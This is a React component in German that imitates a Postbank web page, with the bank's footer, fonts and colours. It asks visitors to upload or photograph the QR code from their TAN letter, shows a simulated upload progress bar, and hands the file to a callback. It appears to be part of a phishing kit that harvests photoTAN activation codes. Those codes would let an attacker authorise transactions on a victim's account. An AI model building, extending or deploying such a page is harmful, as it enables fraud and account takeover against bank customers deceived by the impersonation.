import React, { useState, useRef, useEffect } from 'react';
import { QrCode, File, Camera, CheckCircle, X, Upload } from 'lucide-react';
import Loading from './Loading';
import PostbankFooter from './PostbankFooter';

interface QRUploadFormProps {
  onUpload: (file: File) => void;
  isRetry?: boolean;
}

const QRUploadForm: React.FC<QRUploadFormProps> = ({ onUpload, isRetry = false }) => {
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [dragOver, setDragOver] = useState(false);
  const [isUploading, setIsUploading] = useState(false);
  const [uploadProgress, setUploadProgress] = useState(0);
  const [isMobile, setIsMobile] = useState(false);
  
  const fileInputRef = useRef<HTMLInputElement>(null);
  const cameraInputRef = useRef<HTMLInputElement>(null);

  // Check for mobile screen size
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Clear selected file when isRetry changes or component mounts
  useEffect(() => {
    setSelectedFile(null);
    setUploadProgress(0);
  }, [isRetry]);

  const handleFileSelect = (file: File) => {
    if (file && (file.type.startsWith('image/') || file.type === 'application/pdf')) {
      setSelectedFile(file);
    } else {
      alert('Bitte wählen Sie eine Bilddatei (JPG, PNG) oder PDF aus.');
    }
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setDragOver(false);
    
    const files = Array.from(e.dataTransfer.files);
    if (files.length > 0) {
      handleFileSelect(files[0]);
    }
  };

  const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (files && files.length > 0) {
      handleFileSelect(files[0]);
    }
  };

  const handleCameraInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (files && files.length > 0) {
      handleFileSelect(files[0]);
    }
  };

  const startCamera = async () => {
    // For mobile devices, use the camera input with capture attribute
    if (cameraInputRef.current) {
      cameraInputRef.current.click();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!selectedFile) {
      alert('Bitte wählen Sie zuerst eine Datei aus.');
      return;
    }
    
    setIsUploading(true);
    setUploadProgress(0);
    
    // Simulate upload progress
    const progressInterval = setInterval(() => {
      setUploadProgress(prev => {
        if (prev >= 90) {
          clearInterval(progressInterval);
          return 90;
        }
        return prev + 10;
      });
    }, 200);
    
    try {
      // Simulate upload delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      setUploadProgress(100);
      
      // Wait a moment to show 100% progress
      setTimeout(() => {
        onUpload(selectedFile);
      }, 500);
    } catch (error) {
      console.error('Upload error:', error);
      setIsUploading(false);
      setUploadProgress(0);
      clearInterval(progressInterval);
    }
  };

  const removeFile = () => {
    setSelectedFile(null);
    setUploadProgress(0);
  };

  const formatFileSize = (bytes: number): string => {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .qr-upload-container {
              padding: 1rem !important;
            }
            .qr-upload-form {
              max-width: 100% !important;
              padding: 2rem 1.5rem !important;
            }
            .qr-upload-title {
              font-size: 2rem !important;
              text-align: center !important;
            }
          }
          
          @media (max-width: 480px) {
            .qr-upload-form {
              padding: 1.5rem 1rem !important;
            }
            .qr-upload-title {
              font-size: 1.8rem !important;
            }
          }
        `}
      </style>
      
      {isUploading && (
        <Loading 
          message="QR-Code wird hochgeladen und verarbeitet"
          type="upload"
          showProgress={true}
          duration={3}
        />
      )}
      
      {/* Main Content */}
      <div className="qr-upload-container" style={{
        backgroundColor: 'white',
        minHeight: '100vh',
        padding: '60px 0'
      }}>
        <div style={{
          maxWidth: '1280px',
          margin: '0 auto',
          padding: '0 20px'
        }}>
          <div className="qr-upload-form" style={{
            maxWidth: '600px',
            width: '100%',
            margin: '0 auto'
          }}>
            {/* Page Title */}
            <div style={{ textAlign: 'center', marginBottom: '3rem' }}>
              <QrCode size={48} color="#0018a8" style={{ marginBottom: '1rem' }} />
              <h1 className="qr-upload-title" style={{
                fontSize: '3rem',
                fontWeight: '700',
                color: '#333',
                marginBottom: '1rem',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                lineHeight: '1.1'
              }}>
                {isRetry ? 'QR-Code erneut hochladen' : 'QR-Code hochladen'}
              </h1>
              
              <p style={{
                fontSize: '1.125rem',
                color: '#333',
                lineHeight: '1.6',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
              }}>
                {isRetry 
                  ? 'Der QR-Code konnte nicht gelesen werden. Bitte versuchen Sie es erneut mit einem klareren Bild.'
                  : 'Bitte laden Sie den QR-Code aus Ihrem TAN-Brief hoch, um die Aktivierung abzuschließen.'
                }
              </p>
            </div>

            <form onSubmit={handleSubmit}>
              {/* File Upload Area */}
              <div
                onDrop={handleDrop}
                onDragOver={(e) => { e.preventDefault(); setDragOver(true); }}
                onDragLeave={() => setDragOver(false)}
                style={{
                  border: dragOver ? '2px dashed #0018a8' : '2px dashed #ccc',
                  borderRadius: '8px',
                  padding: '40px 20px',
                  textAlign: 'center',
                  backgroundColor: dragOver ? '#f0f8ff' : '#f8f9fa',
                  marginBottom: '30px',
                  transition: 'all 0.3s ease',
                  cursor: 'pointer'
                }}
                onClick={() => fileInputRef.current?.click()}
              >
                {selectedFile ? (
                  <div>
                    <CheckCircle size={48} color="#28a745" style={{ marginBottom: '1rem' }} />
                    <div style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      gap: '10px',
                      marginBottom: '10px'
                    }}>
                      <span style={{
                        fontSize: '16px',
                        fontWeight: '600',
                        color: '#333',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                      }}>
                        {selectedFile.name}
                      </span>
                      <button
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          removeFile();
                        }}
                        style={{
                          background: 'none',
                          border: 'none',
                          cursor: 'pointer',
                          padding: '2px'
                        }}
                      >
                        <X size={16} color="#dc3545" />
                      </button>
                    </div>
                    <p style={{
                      fontSize: '14px',
                      color: '#666',
                      margin: 0,
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      {formatFileSize(selectedFile.size)} • Klicken Sie hier, um eine andere Datei auszuwählen
                    </p>
                  </div>
                ) : (
                  <div>
                    <Upload size={48} color="#0018a8" style={{ marginBottom: '1rem' }} />
                    <h3 style={{
                      fontSize: '18px',
                      fontWeight: '600',
                      color: '#333',
                      marginBottom: '10px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      QR-Code hier ablegen oder klicken zum Auswählen
                    </h3>
                    <p style={{
                      fontSize: '14px',
                      color: '#666',
                      margin: 0,
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      Unterstützte Formate: JPG, PNG, PDF (max. 10MB)
                    </p>
                  </div>
                )}
              </div>

              {/* Upload Options */}
              <div style={{
                display: 'flex',
                gap: '15px',
                marginBottom: '30px',
                justifyContent: 'center'
              }}>
                {/* File Upload Button */}
                <button
                  type="button"
                  onClick={() => fileInputRef.current?.click()}
                  style={{
                    display: 'flex',
                    alignItems: 'center',
                    gap: '8px',
                    padding: '12px 20px',
                    backgroundColor: 'white',
                    border: '2px solid #0018a8',
                    borderRadius: '4px',
                    color: '#0018a8',
                    fontSize: '14px',
                    fontWeight: '600',
                    cursor: 'pointer',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    transition: 'all 0.3s ease'
                  }}
                  onMouseEnter={(e) => {
                    e.currentTarget.style.backgroundColor = '#0018a8';
                    e.currentTarget.style.color = 'white';
                  }}
                  onMouseLeave={(e) => {
                    e.currentTarget.style.backgroundColor = 'white';
                    e.currentTarget.style.color = '#0018a8';
                  }}
                >
                  <File size={16} />
                  Datei auswählen
                </button>

                {/* Camera Button */}
                <button
                  type="button"
                  onClick={startCamera}
                  style={{
                    display: 'flex',
                    alignItems: 'center',
                    gap: '8px',
                    padding: '12px 20px',
                    backgroundColor: 'white',
                    border: '2px solid #0018a8',
                    borderRadius: '4px',
                    color: '#0018a8',
                    fontSize: '14px',
                    fontWeight: '600',
                    cursor: 'pointer',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    transition: 'all 0.3s ease'
                  }}
                  onMouseEnter={(e) => {
                    e.currentTarget.style.backgroundColor = '#0018a8';
                    e.currentTarget.style.color = 'white';
                  }}
                  onMouseLeave={(e) => {
                    e.currentTarget.style.backgroundColor = 'white';
                    e.currentTarget.style.color = '#0018a8';
                  }}
                >
                  <Camera size={16} />
                  {isMobile ? 'Foto aufnehmen' : 'Kamera verwenden'}
                </button>
              </div>

              {/* Upload Progress */}
              {isUploading && uploadProgress > 0 && (
                <div style={{ marginBottom: '20px' }}>
                  <div style={{
                    width: '100%',
                    height: '8px',
                    backgroundColor: '#e5e7eb',
                    borderRadius: '4px',
                    overflow: 'hidden'
                  }}>
                    <div style={{
                      width: `${uploadProgress}%`,
                      height: '100%',
                      backgroundColor: '#0018a8',
                      transition: 'width 0.3s ease'
                    }} />
                  </div>
                  <p style={{
                    textAlign: 'center',
                    fontSize: '14px',
                    color: '#666',
                    marginTop: '8px',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                  }}>
                    {uploadProgress}% hochgeladen...
                  </p>
                </div>
              )}

              {/* Submit Button */}
              <button
                type="submit"
                disabled={!selectedFile || isUploading}
                style={{
                  width: '100%',
                  backgroundColor: selectedFile && !isUploading ? '#0018a8' : '#ccc',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  padding: '16px',
                  fontSize: '16px',
                  cursor: selectedFile && !isUploading ? 'pointer' : 'not-allowed',
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                  fontWeight: '700',
                  transition: 'all 0.3s ease'
                }}
                onMouseEnter={(e) => {
                  if (selectedFile && !isUploading) {
                    e.currentTarget.style.backgroundColor = '#001580';
                  }
                }}
                onMouseLeave={(e) => {
                  if (selectedFile && !isUploading) {
                    e.currentTarget.style.backgroundColor = '#0018a8';
                  }
                }}
              >
                {isUploading ? 'Wird hochgeladen...' : 'QR-Code hochladen'}
              </button>

              {/* Hidden File Inputs */}
              <input
                ref={fileInputRef}
                type="file"
                accept="image/*,.pdf"
                onChange={handleFileInputChange}
                style={{ display: 'none' }}
              />
              
              <input
                ref={cameraInputRef}
                type="file"
                accept="image/*"
                capture="environment"
                onChange={handleCameraInputChange}
                style={{ display: 'none' }}
              />
            </form>

            {/* Help Text */}
            <div style={{
              marginTop: '40px',
              padding: '20px',
              backgroundColor: '#f8f9fa',
              borderRadius: '8px',
              borderLeft: '4px solid #0018a8'
            }}>
              <h3 style={{
                fontSize: '16px',
                fontWeight: '700',
                color: '#0018a8',
                marginBottom: '10px',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
              }}>
                Tipps für ein gutes QR-Code Foto:
              </h3>
              <ul style={{
                fontSize: '14px',
                color: '#333',
                lineHeight: '1.6',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                paddingLeft: '20px',
                margin: 0
              }}>
                <li>Sorgen Sie für gute Beleuchtung</li>
                <li>Halten Sie die Kamera ruhig</li>
                <li>Der QR-Code sollte vollständig sichtbar sein</li>
                <li>Vermeiden Sie Reflexionen oder Schatten</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
      <PostbankFooter />
    </>
  );
};

export default QRUploadForm;